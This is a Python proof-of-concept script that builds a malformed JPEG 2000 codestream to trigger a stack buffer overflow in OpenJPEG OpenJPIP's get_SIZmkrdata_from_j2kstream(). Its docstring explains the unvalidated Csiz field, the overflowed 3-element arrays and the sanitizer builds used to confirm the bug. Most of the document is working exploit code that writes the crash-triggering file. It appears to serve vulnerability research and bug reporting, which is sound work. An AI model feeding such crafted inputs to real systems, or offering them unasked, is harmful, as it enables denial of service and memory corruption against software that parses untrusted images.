#!/usr/bin/env python3
"""
PoC generator for: stack-buffer-overflow in OpenJPEG OpenJPIP
get_SIZmkrdata_from_j2kstream() (src/lib/openjpip/j2kheader_manager.c)

Builds a minimal raw J2K codestream (SOC marker + SIZ marker) whose Csiz
field (number of image components, a plain attacker-controlled 2-byte
big-endian value, range 0-65535, with NO validation anywhere before use)
drives a for-loop that writes SIZ.Ssiz[i]/XRsiz[i]/YRsiz[i] for
i in [0, Csiz) into fixed 3-element arrays
(`Byte_t Ssiz[3]; Byte_t XRsiz[3]; Byte_t YRsiz[3];` in
SIZmarker_param_t, a STACK-local struct returned by value from this
function -- see index_manager.h). Any Csiz > 3 overflows.

This PoC uses Csiz=50 (a plausible attacker-crafted "malicious SIZ
marker" value, comfortably > 3, matching a realistic multi-component
JPEG2000-like input) and keeps the on-disk component data 1:1 with Csiz
so the READ side stays in-bounds -- isolating the fixed-size WRITE bug
from any unrelated read issue.

NOTE: under the project's default combined -fsanitize=address,undefined
build, UBSan's runtime array-bounds check on `Ssiz[3]` (a statically
sized array, even though `i` is an attacker-controlled runtime index)
fires at i==3, before the write can escalate into a genuine
ASan-detected stack-redzone violation. See build.txt: an ASan-only
build (identical project CMake options, just without
-fsanitize=undefined) is used to obtain conclusive AddressSanitizer
proof of real memory corruption, independent of the UBSan finding.

Output: mal_siz.bin - raw bytes to feed as the j2kstream buffer to
get_mainheader_from_j2kstream(buf, &SIZ, NULL), the real project entry
point that calls get_SIZmkrdata_from_j2kstream() internally.
"""

import struct
import sys


def build(csiz: int) -> bytes:
    out = bytearray()
    out += b"\xff\x4f"          # SOC marker
    out += b"\xff\x51"          # SIZ marker

    xsiz, ysiz = 100, 100
    xtsiz, ytsiz = 100, 100

    siz_body = bytearray()
    siz_body += struct.pack(">H", 0)          # Lsiz placeholder, fixed below
    siz_body += struct.pack(">H", 0)          # Rsiz
    siz_body += struct.pack(">I", xsiz)       # Xsiz
    siz_body += struct.pack(">I", ysiz)       # Ysiz
    siz_body += struct.pack(">I", 0)          # XOsiz
    siz_body += struct.pack(">I", 0)          # YOsiz
    siz_body += struct.pack(">I", xtsiz)      # XTsiz
    siz_body += struct.pack(">I", ytsiz)      # YTsiz
    siz_body += struct.pack(">I", 0)          # XTOsiz
    siz_body += struct.pack(">I", 0)          # YTOsiz
    siz_body += struct.pack(">H", csiz)       # Csiz - attacker controlled
    # 3 bytes per component (Ssiz, XRsiz, YRsiz); keep the READ side fully
    # in-bounds so only the fixed-size WRITE (SIZ.Ssiz[3]/XRsiz[3]/YRsiz[3])
    # is what triggers ASAN, isolating the write bug from any read issue.
    for c in range(csiz):
        siz_body += bytes([1, 1, 1])          # Ssiz=1bpp, XRsiz=1, YRsiz=1

    lsiz = len(siz_body)
    siz_body[0:2] = struct.pack(">H", lsiz)

    out += siz_body
    return bytes(out)


if __name__ == "__main__":
    csiz = int(sys.argv[1]) if len(sys.argv) > 1 else 50
    outfile = sys.argv[2] if len(sys.argv) > 2 else "mal_siz.bin"
    data = build(csiz)
    with open(outfile, "wb") as f:
        f.write(data)
    print(f"wrote {outfile}: {len(data)} bytes, Csiz={csiz}")
